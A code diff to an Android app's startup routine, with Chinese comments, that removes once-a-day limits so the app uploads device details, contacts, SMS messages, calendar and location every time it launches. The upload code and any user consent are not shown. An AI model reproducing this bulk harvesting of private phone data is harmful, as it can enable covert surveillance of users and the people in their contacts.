@@ -553,61 +553,82 @@ public class BaseActivity extends AppCompatActivity {
             + "nowTimeStamp:" + nowTimeStamp);
 
         UploadData uploadData = new UploadData(this);
-        //上传设备信息
-        String deviceLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_DEVICE_TIME);
-        if(!TextUtils.isEmpty(deviceLastTime)) {
-          long deviceLastTimeStamp = Long.parseLong(deviceLastTime);
-          if(deviceLastTimeStamp < todayStartTime) {
-            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
-            uploadData.getAndSendDevice();
-            setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
-          }
-        }
+        //上传设备信息  每次启动APP全量上报
+//        String deviceLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_DEVICE_TIME);
+//        if(!TextUtils.isEmpty(deviceLastTime)) {
+//          long deviceLastTimeStamp = Long.parseLong(deviceLastTime);
+//          if(deviceLastTimeStamp < todayStartTime) {
+//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
+//            uploadData.getAndSendDevice();
+//            setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
+//          }
+//        }
+        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
+        uploadData.getAndSendDevice();
+        setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
 
-        //上传联系人信息
-        String calendarLastTime =
-            KndcStorage.getInstance().getData(KndcStorage.CONFIG_CALENDAR_TIME);
-        if(!TextUtils.isEmpty(calendarLastTime)) {
-          long calendarLastTimeStamp = Long.parseLong(calendarLastTime);
-          if(calendarLastTimeStamp < todayStartTime) {
-            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
-            uploadData.getAndSendContact();
-            setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
-          }
-        }
+        //上传联系人信息  每次启动APP全量上报
+//        String calendarLastTime =
+//            KndcStorage.getInstance().getData(KndcStorage.CONFIG_CALENDAR_TIME);
+//        if(!TextUtils.isEmpty(calendarLastTime)) {
+//          long calendarLastTimeStamp = Long.parseLong(calendarLastTime);
+//          if(calendarLastTimeStamp < todayStartTime) {
+//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
+//            uploadData.getAndSendContact();
+//            setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
+//          }
+//        }
+        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
+        uploadData.getAndSendContact();
+        setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
 
-        //上传短信
+        //上传短信  每次启动APP增量上报
+//        String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
+//        if(!TextUtils.isEmpty(smsLastTime)) {
+//          long smsLastTimeStamp = Long.parseLong(smsLastTime);
+//          if(smsLastTimeStamp < todayStartTime) {
+//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
+//            uploadData.getAndSendSms(smsLastTimeStamp);
+//            setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
+//          }
+//        }
         String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
+        long smsLastTimeStamp = 0;
         if(!TextUtils.isEmpty(smsLastTime)) {
-          long smsLastTimeStamp = Long.parseLong(smsLastTime);
-          if(smsLastTimeStamp < todayStartTime) {
-            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
-            uploadData.getAndSendSms(smsLastTimeStamp);
-            setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
-          }
+          smsLastTimeStamp = Long.parseLong(smsLastTime);
         }
+        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
+        uploadData.getAndSendSms(smsLastTimeStamp);
+        setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
 
-        //上传日程信息
-        String contactLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_CONTACT_TIME);
-        if(!TextUtils.isEmpty(contactLastTime)) {
-          long contactLastTimeStamp = Long.parseLong(contactLastTime);
-          if(contactLastTimeStamp < todayStartTime) {
-            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
-            uploadData.getAndSendCalendar();
-            setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
-          }
-        }
 
-        //上传位置信息
-        String localLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_LOCAL_TIME);
-        if(!TextUtils.isEmpty(localLastTime)) {
-          long localLastTimeStamp = Long.parseLong(localLastTime);
-          if(localLastTimeStamp < todayStartTime) {
-            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
-            uploadData.getAndSendLocation();
-            setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
-          }
-        }
+        //上传日程信息  每次启动APP全量上报
+//        String contactLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_CONTACT_TIME);
+//        if(!TextUtils.isEmpty(contactLastTime)) {
+//          long contactLastTimeStamp = Long.parseLong(contactLastTime);
+//          if(contactLastTimeStamp < todayStartTime) {
+//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
+//            uploadData.getAndSendCalendar();
+//            setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
+//          }
+//        }
+        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
+        uploadData.getAndSendCalendar();
+        setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
+
+        //上传位置信息  每次启动APP全量上报
+//        String localLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_LOCAL_TIME);
+//        if(!TextUtils.isEmpty(localLastTime)) {
+//          long localLastTimeStamp = Long.parseLong(localLastTime);
+//          if(localLastTimeStamp < todayStartTime) {
+//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
+//            uploadData.getAndSendLocation();
+//            setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
+//          }
+//        }
+        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
+        uploadData.getAndSendLocation();
+        setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
       } catch (Exception e) {
         Log.d(TAG, e.getMessage());
         e.printStackTrace();
